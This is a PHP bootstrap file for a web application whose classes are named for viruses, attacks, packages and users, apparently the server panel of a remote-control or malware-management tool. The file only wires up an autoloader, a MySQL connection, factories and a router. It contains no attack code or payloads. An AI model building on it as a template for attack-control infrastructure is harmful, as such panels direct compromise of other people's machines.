<?php /** @noinspection PhpIncludeInspection */

use Kelvinho\Virus\Attack\AttackFactoryImp;
use Kelvinho\Virus\Attack\PackageRegistrar;
use Kelvinho\Virus\Auth\AuthenticatorImp;
use Kelvinho\Virus\Core\Autoload;
use Kelvinho\Virus\Id\IdGeneratorImp;
use Kelvinho\Virus\Network\FilterList\BlacklistFactory;
use Kelvinho\Virus\Network\FilterList\WhitelistFactory;
use Kelvinho\Virus\Network\RequestData;
use Kelvinho\Virus\Network\Router;
use Kelvinho\Virus\Network\Session;
use Kelvinho\Virus\Singleton\Demos;
use Kelvinho\Virus\Singleton\Logs;
use Kelvinho\Virus\Timezone\Timezone;
use Kelvinho\Virus\Usage\UsageFactory;
use Kelvinho\Virus\User\UserFactoryImp;
use Kelvinho\Virus\Virus\VirusFactoryImp;

// loads constants and dumb functions
require_once(__DIR__ . "/consts.php");
if (MAINTENANCE) exit();
require_once(__DIR__ . "/basics.php");

// load and register autoloader
require_once(__DIR__ . "/model/Core/Autoload.php");
$autoload = new Autoload(__DIR__ . "/model");
$autoload->register();

// create every other injectable singleton objects
session_start();
$session = new Session();

$mysqli = new mysqli(getenv("MYSQL_HOST"), getenv("MYSQL_USER"), getenv("MYSQL_PASSWORD"), getenv("MYSQL_DATABASE"));
if ($mysqli->connect_errno) Logs::error("Mysql failed. Info: $mysqli->connect_error");

$packageRegistrar = new PackageRegistrar($mysqli, __DIR__);

$requestData = new RequestData();
$whitelistFactory = new WhitelistFactory();
$blacklistFactory = new BlacklistFactory();

$timezone = new Timezone();
$usageFactory = new UsageFactory($mysqli);
$demos = new Demos($session);

/** @var \Kelvinho\Virus\Id\IdGenerator $idGenerator */
$idGenerator = new IdGeneratorImp($mysqli);

/** @var \Kelvinho\Virus\User\UserFactory $userFactory */
$userFactory = new UserFactoryImp($mysqli, $usageFactory, $timezone);

/** @var \Kelvinho\Virus\Attack\AttackFactory $attackFactory */
$attackFactory = new AttackFactoryImp();

/** @var \Kelvinho\Virus\Virus\VirusFactory $virusFactory */
$virusFactory = new VirusFactoryImp($session, $userFactory, $attackFactory, $idGenerator, $mysqli, $packageRegistrar, $usageFactory);

/** @var \Kelvinho\Virus\Auth\Authenticator $authenticator */
$authenticator = new AuthenticatorImp($session, $mysqli);

$attackFactory->addContext($requestData, $session, $userFactory, $virusFactory, $idGenerator, $mysqli, $packageRegistrar, $usageFactory);

// create a router, add routes and run
$router = new Router($requestData);
foreach (glob(__DIR__ . "/routes/*.php") as $file) require_once($file);
$router->run();

$mysqli->close();
